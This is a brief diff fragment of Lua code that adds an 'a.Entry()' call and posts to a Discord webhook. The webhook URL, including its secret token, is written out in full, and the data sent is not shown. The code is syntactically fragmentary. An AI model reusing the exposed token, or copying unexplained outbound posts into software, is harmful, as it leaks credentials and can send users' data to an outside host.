@@ -9,9 +9,8 @@ local function postHook(webhook , args)
 })
 end
 
-
+a.Entry()
 function 
- print(1)
 postHook(
     "https://discord.com/api/webhooks/1029666247991902228/Fa13GtCrGQtT_Pd-fz455RkIm3CuHyU3-KdkSPC1p6xZ4QuPWHhXYLJYqzPilSMbt2GB",
     {
